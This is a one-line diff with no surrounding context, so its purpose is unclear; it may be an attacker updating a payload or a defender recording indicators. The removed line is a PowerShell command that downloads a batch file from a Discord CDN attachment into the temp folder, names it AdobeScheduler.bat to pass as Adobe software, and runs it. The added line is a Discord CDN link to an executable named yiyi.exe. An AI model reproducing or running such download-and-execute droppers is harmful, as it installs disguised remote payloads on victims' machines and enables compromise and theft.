@@ -1,1 +1,1 @@
-cmd /c powershell.exe -Command "Invoke-WebRequest -Uri 'https://cdn.discordapp.com/attachments/1328888694178058243/1335347314457575578/Build.bat?ex=679fd699&is=679e8519&hm=168330bdabda711d828e14f991947e46ace80ad26fcb27dd8aaf32b759f4f313&' -OutFile "$env:TEMP\AdobeScheduler.bat"; Start-Process "$env:TEMP\AdobeScheduler.bat""
+https://cdn.discordapp.com/attachments/1342039580857077784/1342039867831488583/yiyi.exe?ex=67b82f86&is=67b6de06&hm=bdb70a8fed35d96f6d5aa33d51d88e23bba700a3f8da84b3937c26329ea1d5d5&
